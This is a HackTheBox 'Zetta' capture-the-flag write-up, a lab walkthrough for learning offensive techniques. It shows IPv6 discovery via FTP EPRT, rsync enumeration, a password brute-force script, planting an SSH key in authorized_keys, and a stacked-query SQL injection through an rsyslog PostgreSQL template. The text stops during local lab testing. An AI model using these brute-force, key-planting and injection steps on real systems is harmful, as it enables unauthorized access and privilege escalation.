---
title:  "Hackthebox - Zetta"
date:   2020-02-23 21:01:25 +0100
categories: hackthebox
published: true
---

{% include image-center.html url="/assets/htb-zetta.png" alt="Info Card" %}

## user

Scanning the box with [nmap](https://tools.kali.org/information-gathering/nmap) reveals 3 open ports: FTP on port 21, SSH on port 22 and a web server on port 80:

```bash
# Nmap 7.80 scan initiated Tue Sep  3 16:43:22 2019 as: nmap -Pn -sCV -p21,22,80 -oN nmap/Basic_10.10.10.156.nmap 10.10.10.156
Nmap scan report for 10.10.10.156
Host is up (0.018s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     Pure-FTPd
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10 (protocol 2.0)
| ssh-hostkey: 
|   2048 2d:82:60:c1:8c:8d:39:d2:fc:8b:99:5c:a2:47:f0:b0 (RSA)
|   256 1f:1b:0e:9a:91:b1:10:5f:75:20:9b:a0:8e:fd:e4:c1 (ECDSA)
|_  256 b5:0c:a1:2c:1c:71:dd:88:a4:28:e0:89:c9:a3:a0:ab (ED25519)
80/tcp open  http    nginx
|_http-title: Ze::a Share
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Sep  3 16:43:56 2019 -- 1 IP address (1 host up) scanned in 33.76 seconds
```

The website on port 80 displays the following credentials for connecting to the box via FTP:

```bash
Username: Sq00GZUTxIqqnh7shss4VRWwWWwPrqqc
Password: Sq00GZUTxIqqnh7shss4VRWwWWwPrqqc
```

FTP creds are generated clientside, we can login with any 32 character string for username & password. This was discovered by viewing the source code of the website:

```html
<script>
function randomString(length, chars) {
    var result = '';
    for (var i = length; i > 0; --i) result += chars[Math.floor(Math.random() * chars.length)];
    return result;
}
var rString = randomString(32, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ');
</script>
...
<div class="center gap fade-down section-heading">
	<h2 class="main-title">Sharing</h2>
	<hr>
	<p>Use the below credentials on our shiny FTP server and start sharing:</p>
</div>
<div class="row">
	<div class="col-md-4 col-sm-6">
	</div><!--/.col-md-4-->
	<div class="col-md-6 col-sm-6">
		<div class="service-block">
			<div class="pull-left bounce-in">
				<i class="fa fa-user fa fa-md"></i>
			</div>
			<div class="media-body fade-up">
				<h3 class="media-heading">Username</h3>
				<p><script>document.write(rString)</script></p>
			</div>
		</div>
	</div><!--/.col-md-4-->
	<div class="col-md-2 col-sm-6">
	</div><!--/.col-md-4-->
</div><!--/.row-->
```


The website contains some hints about FXP being enabled, RFC2428 and dual-stack (IPv6):

```bash
Native FTP

We support native FTP with FXP enabled. We also support RFC2428.

...

Dual-Stack
Almost there. 
```

This means that we probably need to enumerate the box via ipv6 address in order to discover additional open ports.

Find out own global ipv6 address:

```bash
$ ifconfig tun0
tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
        inet 10.10.12.232  netmask 255.255.252.0  destination 10.10.12.232
        inet6 fe80::5864:a812:81c9:b177  prefixlen 64  scopeid 0x20<link>
        inet6 dead:beef:2::10e6  prefixlen 64  scopeid 0x0<global>
        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 100  (UNSPEC)
        RX packets 842983  bytes 124133880 (118.3 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1041191  bytes 83958812 (80.0 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

=> ipv6 address is `dead:beef:2::10e6`


Initiate a site-to-site transfer with the `EPRT` command as described in `https://tools.ietf.org/html/rfc2428`:

```bash
$ nc 10.10.10.156 21
220---------- Welcome to Pure-FTPd [privsep] [TLS] ----------
220-You are user number 3 of 500 allowed.
220-Local time is now 07:44. Server port: 21.
220-This is a private system - No anonymous login
220-IPv6 connections are also welcome on this server.
220 You will be disconnected after 15 minutes of inactivity.
USER bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
331 User bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb OK. Password required
PASS bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
230-This server supports FXP transfers
230-OK. Current restricted directory is /
230-2 files used (20%) - authorized: 10 files
230 0 Kbytes used (0%) - authorized: 1024 Kb
EPRT |2|dead:beef:2::10e6|1234|
200-FXP transfer: from 10.10.12.232 to dead:beef:2::10e6%160
200 PORT command successful
stor asdf
150 Connecting to port 1234
```

Netcat listener displays remote ipv6 address:

```bash
$ ncat -6 -nlvp 1234
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Connection from dead:beef::250:56ff:feb9:d75d.
Ncat: Connection from dead:beef::250:56ff:feb9:d75d:60862.
```

Full portscan of ipv6 address reveals an additional high port:

```bash
$ nmap -p- -6 de
ad:beef::250:56ff:feb9:d75d
Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-07 07:51 EDT
Nmap scan report for dead:beef::250:56ff:feb9:d75d
Host is up (0.024s latency).
Not shown: 65531 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
8730/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 25.08 seconds
```

Perform a service scan of port 8730 => it seems to be rsync:

```bash
$ nmap -6 -p8730
 -sV -sC dead:beef::250:56ff:feb9:d75d
Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-07 07:52 EDT
Nmap scan report for dead:beef::250:56ff:feb9:d75d
Host is up (0.019s latency).

PORT     STATE SERVICE VERSION
8730/tcp open  rsync   (protocol version 31)

Host script results:
| address-info:
|   IPv6 EUI-64:
|     MAC address:
|       address: 00:50:56:b9:d7:5d
|_      manuf: VMware

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2.13 seconds
```

Try to connect anonymously and list modules:

```bash
$ rsync --list-only --port=8730 '[dead:beef::250:56ff:feb9:d75d]::'
****** UNAUTHORIZED ACCESS TO THIS RSYNC SERVER IS PROHIBITED ******

You must have explicit, authorized permission to access this rsync
server. Unauthorized attempts and actions to access or use this
system may result in civil and/or criminal penalties.

All activities performed on this device are logged and monitored.

****** UNAUTHORIZED ACCESS TO THIS RSYNC SERVER IS PROHIBITED ******

@ZE::A staff

This rsync server is solely for access to the zetta master server.
The modules you see are either provided for "Backup access" or for
"Cloud sync".


bin             Backup access to /bin
boot            Backup access to /boot
lib             Backup access to /lib
lib64           Backup access to /lib64
opt             Backup access to /opt
sbin            Backup access to /sbin
srv             Backup access to /srv
usr             Backup access to /usr
var             Backup access to /var
```

The `/etc` folder is not listed, try to access it anyway:

```bash
$ rsync --list-only --port=8730 '[dead:beef::250:56ff:feb9:d75d]::etc'
****** UNAUTHORIZED ACCESS TO THIS RSYNC SERVER IS PROHIBITED ******

You must have explicit, authorized permission to access this rsync
server. Unauthorized attempts and actions to access or use this
system may result in civil and/or criminal penalties.

All activities performed on this device are logged and monitored.

****** UNAUTHORIZED ACCESS TO THIS RSYNC SERVER IS PROHIBITED ******

@ZE::A staff

This rsync server is solely for access to the zetta master server.
The modules you see are either provided for "Backup access" or for
"Cloud sync".


drwxr-xr-x          4,096 2019/08/31 15:44:23 .
-rw-r--r--          2,981 2019/07/27 03:01:29 adduser.conf
-rw-r--r--             44 2019/07/27 03:03:30 adjtime
-rw-r--r--          1,994 2019/04/18 00:12:36 bash.bashrc
-rw-r--r--            367 2018/03/02 15:03:58 bindresvport.blacklist
-rw-r--r--          5,713 2019/07/27 03:07:27 ca-certificates.conf
-rw-r--r--          1,042 2019/06/23 13:49:01 crontab
-rw-r--r--          2,969 2019/02/26 04:30:35 debconf.conf
-rw-r--r--              5 2019/04/19 07:00:00 debian_version
-rw-r--r--            604 2016/06/26 16:00:56 deluser.conf
-rw-r--r--            346 2018/01/14 16:27:01 discover-modprobe.conf
-rw-r--r--              0 2019/07/27 03:01:28 environment
-rw-r--r--            664 2019/08/27 05:39:06 fstab
-rw-r--r--            130 2019/01/28 13:56:17 ftpallow
-rw-r--r--            177 2019/01/28 13:56:17 ftpusers
-rw-r--r--          2,584 2018/08/01 01:10:47 gai.conf
-rw-r--r--            735 2019/07/27 06:00:50 group
-rw-r--r--            732 2019/07/27 03:07:28 group-
-rw-r--r--              9 2006/08/07 13:14:09 host.conf
-rw-r--r--              6 2019/07/27 03:01:35 hostname
-rw-r--r--            195 2019/07/27 03:01:35 hosts
-rw-r--r--            411 2019/07/27 03:03:12 hosts.allow
-rw-r--r--            711 2019/07/27 03:03:12 hosts.deny
-rw-r--r--          1,056 2019/07/27 03:07:19 inetd.conf
-rw-r--r--          1,748 2018/05/05 10:52:46 inputrc
-rw-r--r--             27 2019/05/13 16:25:32 issue
-rw-r--r--             20 2019/05/13 16:25:32 issue.net
-rw-r--r--            144 2019/07/27 03:03:27 kernel-img.conf
-rw-r--r--         15,337 2019/08/27 05:38:58 ld.so.cache
-rw-r--r--             34 2018/03/02 15:03:58 ld.so.conf
-rw-r--r--            191 2019/04/25 10:47:32 libaudit.conf
-rw-r--r--          2,995 2019/05/01 13:24:19 locale.alias
-rw-r--r--          9,376 2019/07/27 03:01:37 locale.gen
lrwxrwxrwx             30 2019/07/27 03:01:39 localtime
-rw-r--r--         10,477 2018/07/27 04:07:37 login.defs
-rw-r--r--            435 2018/08/22 03:05:31 logrotate.conf
-r--r--r--             33 2019/07/27 03:01:30 machine-id
-rw-r--r--            111 2019/03/02 02:05:54 magic
-rw-r--r--            111 2019/03/02 02:05:54 magic.mime
-rw-r--r--          2,514 2019/07/27 03:01:47 mailcap
-rw-r--r--            449 2019/02/09 07:32:33 mailcap.order
-rw-r--r--         24,512 2019/02/09 07:32:33 mime.types
-rw-r--r--            812 2018/12/15 22:46:49 mke2fs.conf
-rw-r--r--            195 2019/07/27 03:01:34 modules
-rw-r--r--              0 2019/07/27 06:43:25 motd
lrwxrwxrwx             19 2019/07/27 03:03:46 mtab
-rw-r--r--          9,278 2019/06/11 20:23:23 nanorc
-rw-r--r--             60 2019/07/27 03:01:34 networks
-rw-r--r--            494 2019/02/10 11:13:53 nsswitch.conf
lrwxrwxrwx             21 2019/05/13 16:25:32 os-release
-rw-r--r--            552 2019/02/14 02:08:47 pam.conf
-rw-r--r--          1,462 2019/07/27 03:07:28 passwd
-rw-r--r--          1,435 2019/07/27 03:07:28 passwd-
-rw-r--r--            767 2016/03/04 06:00:00 profile
-rw-r--r--          2,932 2019/02/09 21:05:36 protocols
-rw-r--r--             81 2019/08/14 10:49:09 resolv.conf
lrwxrwxrwx             13 2019/04/23 12:05:54 rmt
-rw-r--r--            887 2019/02/09 21:05:36 rpc
-rw-r--r--          2,930 2019/08/31 15:44:14 rsyncd.conf
-rw-r--r--            558 2019/07/27 06:39:04 rsyncd.motd
-rw-r--r--          2,006 2019/07/27 06:43:25 rsyslog.conf
-rw-r--r--          4,141 2018/07/27 04:07:37 securetty
-rw-r--r--         10,593 2018/12/19 10:58:53 sensors3.conf
-rw-r--r--         18,774 2019/02/09 21:05:36 services
-rw-r--r--            116 2019/07/27 03:01:28 shells
-rw-r--r--             17 2019/07/27 03:03:28 subgid
-rw-r--r--              0 2019/07/27 03:01:29 subgid-
-rw-r--r--             17 2019/07/27 03:03:28 subuid
-rw-r--r--              0 2019/07/27 03:01:29 subuid-
-rw-r--r--          2,781 2019/07/27 06:41:59 sysctl.conf
-rw-r--r--             11 2019/07/27 03:01:39 timezone
-rw-r--r--          4,182 2019/07/27 03:07:33 tudurc
-rw-r--r--          1,260 2018/12/14 03:51:14 ucf.conf
-rw-r--r--            642 2019/03/01 17:03:21 xattr.conf
drwxr-xr-x          4,096 2019/07/27 03:02:05 X11
drwxr-xr-x         20,480 2019/07/27 03:07:30 alternatives
drwxr-xr-x          4,096 2019/07/27 03:01:55 apparmor.d
drwxr-xr-x          4,096 2019/07/27 03:01:55 apparmor
drwxr-xr-x          4,096 2019/07/27 03:03:28 apt
drwxr-xr-x          4,096 2019/07/27 03:07:33 bash_completion.d
drwxr-xr-x          4,096 2019/05/24 16:58:59 binfmt.d
drwxr-xr-x          4,096 2019/07/27 03:07:19 ca-certificates
drwxr-xr-x          4,096 2019/07/27 03:01:35 calendar
drwxr-xr-x          4,096 2019/07/27 03:02:07 console-setup
drwxr-xr-x          4,096 2019/07/27 03:07:25 cron.d
drwxr-xr-x          4,096 2019/07/27 03:07:25 cron.daily
drwxr-xr-x          4,096 2019/07/27 03:01:34 cron.hourly
drwxr-xr-x          4,096 2019/07/27 03:01:34 cron.monthly
drwxr-xr-x          4,096 2019/07/27 03:01:34 cron.weekly
drwxr-xr-x          4,096 2019/07/27 03:07:46 dbconfig-common
drwxr-xr-x          4,096 2019/07/27 03:03:09 dbus-1
drwxr-xr-x          4,096 2019/07/27 03:07:33 default
drwxr-xr-x          4,096 2019/07/27 03:01:35 dhcp
drwxr-xr-x          4,096 2019/07/27 03:03:13 dictionaries-common
drwxr-xr-x          4,096 2019/07/27 03:02:52 discover.conf.d
drwxr-xr-x          4,096 2019/07/27 03:01:28 dpkg
drwxr-xr-x          4,096 2019/07/27 03:03:10 emacs
drwxr-xr-x          4,096 2019/07/27 03:03:19 grub.d
drwxr-xr-x          4,096 2019/07/27 03:03:10 gss
drwxr-xr-x          4,096 2019/08/27 05:38:39 init.d
drwxr-xr-x          4,096 2019/07/27 03:01:40 initramfs-tools
drwxr-xr-x          4,096 2019/07/27 03:01:34 iproute2
drwxr-xr-x          4,096 2019/08/14 10:50:36 iptables
drwxr-xr-x          4,096 2019/07/27 03:01:40 kernel
drwxr-xr-x          4,096 2019/08/27 05:38:58 ld.so.conf.d
drwxr-xr-x          4,096 2019/07/27 03:07:25 ldap
drwxr-xr-x          4,096 2019/07/27 03:01:33 logcheck
drwxr-xr-x          4,096 2019/07/27 03:07:43 logrotate.d
drwxr-xr-x          4,096 2019/02/09 18:00:31 modprobe.d
drwxr-xr-x          4,096 2019/07/27 03:01:30 modules-load.d
drwxr-xr-x          4,096 2019/08/14 11:07:50 network
drwxr-xr-x          4,096 2019/07/27 06:36:48 nginx
drwxr-xr-x          4,096 2019/07/27 03:01:20 opt
drwxr-xr-x          4,096 2019/08/27 05:38:49 pam.d
drwxr-xr-x          4,096 2019/07/27 03:07:18 perl
drwxr-xr-x          4,096 2019/07/27 03:07:28 postgresql-common
drwxr-xr-x          4,096 2019/07/27 03:07:29 postgresql
drwxr-xr-x          4,096 2019/05/13 16:25:32 profile.d
drwxr-xr-x          4,096 2019/07/27 03:11:32 pure-ftpd
drwxr-xr-x          4,096 2019/07/27 03:01:41 python3.7
drwxr-xr-x          4,096 2019/07/27 03:01:55 python3
drwxr-xr-x          4,096 2019/08/27 05:38:54 rc0.d
drwxr-xr-x          4,096 2019/08/27 05:38:54 rc1.d
drwxr-xr-x          4,096 2019/08/27 05:38:54 rc2.d
drwxr-xr-x          4,096 2019/08/27 05:38:54 rc3.d
drwxr-xr-x          4,096 2019/08/27 05:38:54 rc4.d
drwxr-xr-x          4,096 2019/08/27 05:38:54 rc5.d
drwxr-xr-x          4,096 2019/08/27 05:38:54 rc6.d
drwxr-xr-x          4,096 2019/07/27 03:07:25 rcS.d
drwxr-xr-x          4,096 2019/07/27 07:01:41 rsyslog.d
drwxr-xr-x          4,096 2019/07/27 03:01:28 security
drwxr-xr-x          4,096 2019/07/27 03:01:27 selinux
drwxr-xr-x          4,096 2019/07/27 03:07:24 sensors.d
drwxr-xr-x          4,096 2019/07/27 03:01:28 skel
drwxr-xr-x          4,096 2019/07/27 03:03:13 ssh
drwxr-xr-x          4,096 2019/07/27 03:07:25 ssl
drwxr-xr-x          4,096 2019/07/27 03:07:28 sysctl.d
drwxr-xr-x          4,096 2019/07/27 03:07:25 sysstat
drwxr-xr-x          4,096 2019/07/27 03:01:30 systemd
drwxr-xr-x          4,096 2019/07/27 03:01:27 terminfo
drwxr-xr-x          4,096 2019/05/24 16:58:59 tmpfiles.d
drwxr-xr-x          4,096 2019/07/27 03:01:34 udev
drwxr-xr-x          4,096 2019/07/27 03:03:11 ufw
drwxr-xr-x          4,096 2019/07/27 03:01:28 update-motd.d
drwxr-xr-x          4,096 2019/07/27 03:01:35 vim
drwxr-xr-x          4,096 2019/08/27 05:38:45 vmware-caf
drwxr-xr-x          4,096 2019/08/27 05:39:03 vmware-tools
drwxr-xr-x          4,096 2019/07/27 03:01:30 xdg
```

Fetch `rsyncd.conf`:

```bash
$ rsync --port=8730 '[dead:beef::250:56ff:feb9:d75d]::etc/rsyncd.conf' /tmp/rsyncd.conf
```

Content of `rsyncd.conf`:

```bash
$ cat /tmp/rsyncd.conf
# GLOBAL OPTIONS

# Change port so that we won't be in shodan

reverse lookup = no
port = 8730
use chroot = yes
lock file = /var/lock/rsyncd
motd file = /etc/rsyncd.motd
strict modes = yes
ignore errors = no
ignore nonreadable = yes
transfer logging = no
log format = %t: host %h (%a) %o %f (%l bytes). Total %b bytes.
dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz
read only = yes
uid = backup
gid = backup

# MODULE OPTIONS

# Allow backup server to backup /bin
[bin]
        comment = Backup access to /bin
        path = /bin
        # Allow access from backup server only.
        hosts allow = 104.24.0.54

# Allow backup server to backup /boot
[boot]
        comment = Backup access to /boot
        path = /boot
        # Allow access from backup server only.
        hosts allow = 104.24.0.54

# *** WORK IN PROGRESS ***
# Allow access to /etc to sync configuration files throughout the complete
# cloud server farm. IP addresses from https://ip-ranges.amazonaws.com/ip-ranges.json
#
[etc]
        comment = Backup access to /etc. Also used for cloud sync access.
        path = /etc
        # Do not leak .git repos onto the not so trusted slave servers in the cloud.
        exclude = .git
        # Temporarily disabled access to /etc for security reasons, the networks are
        # have been found to access the share! Only allow 127.0.0.1, deny 0.0.0.0/0!
        #hosts allow = 104.24.0.54 13.248.97.0/24 52.94.69.0/24 52.219.72.0/22
        hosts allow = 127.0.0.1/32
        hosts deny = 0.0.0.0/0
        # Hiding it for now.
        list = false

# Allow backup server to backup /lib
[lib]
        comment = Backup access to /lib
        path = /lib
        # Allow access from backup server only.
        hosts allow = 104.24.0.54

# Allow backup server to backup /lib64
[lib64]
        comment = Backup access to /lib64
        path = /lib64
        # Allow access from backup server only.
        hosts allow = 104.24.0.54

# Allow backup server to backup /opt
[opt]
        comment = Backup access to /opt
        path = /opt
        # Allow access from backup server only.
        hosts allow = 104.24.0.54

# Allow backup server to backup /sbin
[sbin]
        comment = Backup access to /sbin
        path = /sbin
        # Allow access from backup server only.
        hosts allow = 104.24.0.54

# Allow backup server to backup /srv
[srv]
        comment = Backup access to /srv
        path = /srv
        # Allow access from backup server only.
        hosts allow = 104.24.0.54

# Allow backup server to backup /usr
[usr]
        comment = Backup access to /usr
        path = /usr
        # Allow access from backup server only.
        hosts allow = 104.24.0.54

# Allow backup server to backup /var
[var]
        comment = Backup access to /var
        path = /var
        # Allow access from backup server only.
        hosts allow = 104.24.0.54

# Syncable home directory for .dot file sync for me.
# NOTE: Need to get this into GitHub repository and use git for sync.
[home_roy]
        path = /home/roy
        read only = no
        # Authenticate user for security reasons.
        uid = roy
        gid = roy
        auth users = roy
        secrets file = /etc/rsyncd.secrets
        # Hide home module so that no one tries to access it.
        list = false
```

Looks like we might be able to access `/home/roy` if we can find out `roy`'s password. `/etc/rsyncd.secrets` is not readable => bruteforce rsync password with the following script:

```bash
#!/bin/bash

while read -r line; do
        result="$(sshpass -p "$line" rsync -q --port=8730 --list-only 'roy@[dead:beef::250:56ff:feb9:d75d]::home_roy' 2>&1)"
		echo -e -n "\rTrying $line ..."
        if [ -z "$(echo "$result" | grep "auth failed")" ]; then
                echo -e "\r!!! Password found: $line !!!"
                exit 0
        fi
done < /usr/share/seclists/Passwords/probable-v2-top1575.txt
```

Run it:

```bash
$ ./bruteforce-rsync.sh
!!! Password found: computer !!!
```

List `/home/roy`:

```bash
$ sshpass -p computer rsync --port=8730 --list-only 'roy@[dead:beef::250:56ff:feb9:d75d]::home_roy'
****** UNAUTHORIZED ACCESS TO THIS RSYNC SERVER IS PROHIBITED ******

You must have explicit, authorized permission to access this rsync
server. Unauthorized attempts and actions to access or use this
system may result in civil and/or criminal penalties.

All activities performed on this device are logged and monitored.

****** UNAUTHORIZED ACCESS TO THIS RSYNC SERVER IS PROHIBITED ******

@ZE::A staff

This rsync server is solely for access to the zetta master server.
The modules you see are either provided for "Backup access" or for
"Cloud sync".


drwxr-xr-x          4,096 2019/09/07 11:24:49 .
lrwxrwxrwx              9 2019/07/27 06:57:06 .bash_history
-rw-r--r--            220 2019/07/27 03:03:28 .bash_logout
-rw-r--r--          3,526 2019/07/27 03:03:28 .bashrc
-rw-r--r--            807 2019/07/27 03:03:28 .profile
-rw-------          4,752 2019/07/27 05:24:24 .tudu.xml
-r--r--r--             33 2019/07/27 05:24:24 user.txt
drwxr-xr-x          4,096 2019/09/07 11:23:46 .ssh
```

Fetch `authorized_keys` file:

```bash
$ sshpass -p computer rsync --port=8730 'roy@[dead:beef::250:56ff:feb9:d75d]::home_roy/.ssh/authorized_keys' authorized_keys
```

Add own SSH public key to `authorized_keys` file and sync file to the server:

```bash
$ echo [SSHKEY] >> authorized_keys
$ sshpass -p computer rsync --port=8730 authorized:keys 'roy@[dead:beef::250:56ff:feb9:d75d]::home_roy/.ssh/authorized_keys'
```

Login via SSH is now possible as user `roy`:

```bash
$ ssh roy@10.10.10.156
The authenticity of host '10.10.10.156 (10.10.10.156)' can't be established.
ECDSA key fingerprint is SHA256:Nr2jyov/dW2JtY30gnfZ1jZQXALR00IEjM70LXWg08M.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.156' (ECDSA) to the list of known hosts.
Linux zetta 4.19.0-5-amd64 #1 SMP Debian 4.19.37-5+deb10u1 (2019-07-19) x86_64
Last login: Sat Sep  7 11:23:59 2019 from dead:beef:2::1002
roy@zetta:~$ ls
a  pspy64  test  user.txt
roy@zetta:~$ cat user.txt 
****************************be91
roy@zetta:~$ 
```

## Root

The following git repos exist under `/etc/`:

* nginx
* pure-ftpd
* rsyslog.d

The `rsyslog.d` folder contains `pgsql.conf` which we cannot read, however, the previous version of that file can be restored by downloading the git repo to the attacker system and perform a `git reset --hard`.

Content of `pgsql.conf`:

```bash
### Configuration file for rsyslog-pgsql
### Changes are preserved

# https://www.rsyslog.com/doc/v8-stable/configuration/modules/ompgsql.html
#
# Used default template from documentation/source but adapted table
# name to syslog_lines so the Ruby on Rails application Maurice is
# coding can use this as SyslogLine object.
#
template(name="sql-syslog" type="list" option.sql="on") {
  constant(value="INSERT INTO syslog_lines (message, devicereportedtime) values ('")
  property(name="msg")
  constant(value="','")
  property(name="timereported" dateformat="pgsql" date.inUTC="on")
  constant(value="')")
}

# load module
module(load="ompgsql")

# Only forward local7.info for testing.
local7.info action(type="ompgsql" server="localhost" user="postgres" pass="test1234" db="syslog" template="sql-syslog")
```

This means that log messages sent to the logging facility `local7` with loglevel `info` get stored in the table `syslog_lines` in the postgresql database `syslog`.

The given password doesn't work for the `postgresql` user (tested with `su`).

The SQL template looks exploitable because user input is concatenated to the SQL statement. However, a simple SQL injection does not seem to work due to `option.sql="on"` - single quotes are escaped. Weirdly, this template is taken directly from rsyslog's documentation. 

Versions on the box seem to be up-to-date for Debian buster:

```bash
postgres@zetta:~/.ssh$ cat /etc/os-release 
PRETTY_NAME="Debian GNU/Linux 10 (buster)"
NAME="Debian GNU/Linux"
VERSION_ID="10"
VERSION="10 (buster)"
VERSION_CODENAME=buster
ID=debian
HOME_URL="https://www.debian.org/"
SUPPORT_URL="https://www.debian.org/support"
BUG_REPORT_URL="https://bugs.debian.org/"
postgres@zetta:~/.ssh$ dpkg -l | grep "postgresql"
ii  postgresql                    11+200+deb10u1              all          object-relational SQL database (supported version)
ii  postgresql-11                 11.4-1                      amd64        object-relational SQL database, version 11 server
ii  postgresql-client-11          11.4-1                      amd64        front-end programs for PostgreSQL 11
ii  postgresql-client-common      200+deb10u1                 all          manager for multiple PostgreSQL client versions
ii  postgresql-common             200+deb10u1                 all          PostgreSQL database-cluster manager
postgres@zetta:~/.ssh$ dpkg -l | grep "rsyslog"
ii  rsyslog                       8.1901.0-1                  amd64        reliable system and kernel logging daemon
ii  rsyslog-pgsql                 8.1901.0-1                  amd64        PostgreSQL output plugin for rsyslog
```

In order to find out what exactly is going on, I mirrored the rsyslog / postgresql config with a local Debian vagrant box.

Vagrantfile:

```bash
Vagrant.configure("2") do |config|
  config.vm.box = "debian/buster64"
  config.vm.hostname = "debian-box"
  config.vm.network "private_network", ip: "10.10.1.30"

  config.vm.provider "virtualbox" do |vb|
    # Customize the amount of memory on the VM:
    vb.memory = 4096

    # Customize the name of the box in the VirtualBox GUI
    vb.name = "debian-box"
  end
end
```

Install / configure stuff:

```bash
vagrant@debian-box:~$ sudo apt update
vagrant@debian-box:~$ sudo apt upgrade
vagrant@debian-box:~$ sudo apt install rsyslog
vagrant@debian-box:~$ sudo apt install  postgresql
vagrant@debian-box:~$ sudo apt install rsyslog-pgsql
```

Turn on postgresql logging of every statement in `/etc/postgresql/11/main/postgresql.conf`:

```bash
log_statement = 'all'                   # none, ddl, mod, all
```

Copy `pgsql` config from htb box to system, adapting table and database name:

```bash
root@debian-box:/etc/rsyslog.d# cat pgsql.conf
### Configuration file for rsyslog-pgsql

# https://www.rsyslog.com/doc/v8-stable/configuration/modules/ompgsql.html
template(name="sql-syslog" type="list" option.sql="on") {
  constant(value="INSERT INTO systemevents (message, devicereportedtime) values ('")
  property(name="msg")
  constant(value="','")
  property(name="timereported" dateformat="pgsql" date.inUTC="on")
  constant(value="')")
}

module (load="ompgsql")
local7.info action(type="ompgsql" server="localhost" db="Syslog" uid="rsyslog" pwd="test1234" template="sql-syslog")
```

Generate log messages:

```bash
root@debian-box:~# logger -p local7.info "asdf"
```

Watch corresponding sql insert statements:

```bash
root@debian-box:~# tail -f /var/log/postgresql/postgresql-11-main.log
2019-09-08 10:57:22.448 GMT [28063] rsyslog@Syslog LOG:  statement: BEGIN
2019-09-08 10:57:22.450 GMT [28063] rsyslog@Syslog LOG:  statement: INSERT INTO systemevents (message, devicereportedtime) values (' asdf','2019-09-08 10:57:22')
2019-09-08 10:57:22.451 GMT [28063] rsyslog@Syslog LOG:  statement: COMMIT
```

Inserting single quotes does not work, but it breaks the sql statement:

```bash
root@debian-box:~# logger -p local7.info $'testoo\''
```

Watch corresponding sql insert statements:

```bash
2019-09-08 11:03:27.315 GMT [28322] rsyslog@Syslog ERROR:  syntax error at or near "2019" at character 77
2019-09-08 11:03:27.315 GMT [28322] rsyslog@Syslog STATEMENT:  INSERT INTO systemevents (message, devicereportedtime) values (' testoo\'','2019-09-08 11:03:27')
2019-09-08 11:03:27.321 GMT [28337] rsyslog@Syslog ERROR:  syntax error at or near "2019" at character 77
2019-09-08 11:03:27.321 GMT [28337] rsyslog@Syslog STATEMENT:  INSERT INTO systemevents (message, devicereportedtime) values (' testoo\'','2019-09-08 11:03:27')
2019-09-08 11:03:27.326 GMT [28338] rsyslog@Syslog LOG:  statement: COMMIT
2019-09-08 11:03:27.326 GMT [28338] rsyslog@Syslog WARNING:  there is no transaction in progress
```

It seems that `rsyslog` escapes single quotes with `\` but `postgres` treats backslashes as a literal character.

Therefore, it is possible to escape the user input, complete the statement and append arbitrary additional statements as follows:

```bash
root@debian-box:~# logger -p local7.info $'testoo\', now()); select 1; --'
```

Watch corresponding sql insert statements:

```bash
2019-09-08 11:00:06.738 GMT [28322] rsyslog@Syslog LOG:  statement: BEGIN
2019-09-08 11:00:06.738 GMT [28322] rsyslog@Syslog LOG:  statement: INSERT INTO systemevents (message, devicereportedtime) values (' testoo\', now()); select 1; --','2019-09-08 11:00:06')
2019-09-08 11:00:06.739 GMT [28322] rsyslog@Syslog LOG:  statement: COMMIT
```

Postgresql allows to quote strings with `$$` instead of `'`, therefore, we can even use quoted strings in our payload:

```bash
root@debian-box:~# logger -p local7.info $'testoo\', now()); select $$1$$; --'
```

Watch corresponding sql insert statements:

```bash
2019-09-08 11:11:02.899 GMT [28338] rsyslog@Syslog LOG:  statement: BEGIN
2019-09-08 11:11:02.899 GMT [28338] rsyslog@Syslog LOG:  statement: INSERT INTO systemevents (message, devicereportedtime) values (' testoo\', now()); select $$1$$; --','2019-09-08 11:11:02')
2019-09-08 11:11:02.900 GMT [28338] rsyslog@Syslog LOG:  statement: COMMIT
```

On our box, it is not possible to use the `COPY TO` command to copy a table to the local file system. 

```bash
root@debian-box:~# logger -p local7.info $'asdf\',now()); copy systemevents to $$/tmp/itworks$$ --'
```

Watch corresponding sql insert statements:

```bash
2019-09-08 11:16:57.459 GMT [28338] rsyslog@Syslog LOG:  statement: BEGIN
2019-09-08 11:16:57.460 GMT [28338] rsyslog@Syslog LOG:  statement: INSERT INTO systemevents (message, devicereportedtime) values (' asdf\',now()); copy systemevents to $$/tmp/itworks$$ --','2019-09-08 11:16:57')
2019-09-08 11:16:57.460 GMT [28338] rsyslog@Syslog ERROR:  must be superuser or a member of the pg_write_server_files role to COPY to a file
2019-09-08 11:16:57.460 GMT [28338] rsyslog@Syslog HINT:  Anyone can COPY to stdout or from stdin. psql's \copy command also works for anyone.
2019-09-08 11:16:57.460 GMT [28338] rsyslog@Syslog STATEMENT:  INSERT INTO systemevents (message, devicereportedtime) values (' asdf\',now()); copy systemevents to $$/tmp/itworks$$ --','2019-09-08 11:16:57')
2019-09-08 11:16:57.469 GMT [28388] rsyslog@Syslog LOG:  statement: INSERT INTO systemevents (message, devicereportedtime) values (' asdf\',now()); copy systemevents to $$/tmp/itworks$$ --','2019-09-08 11:16:57')
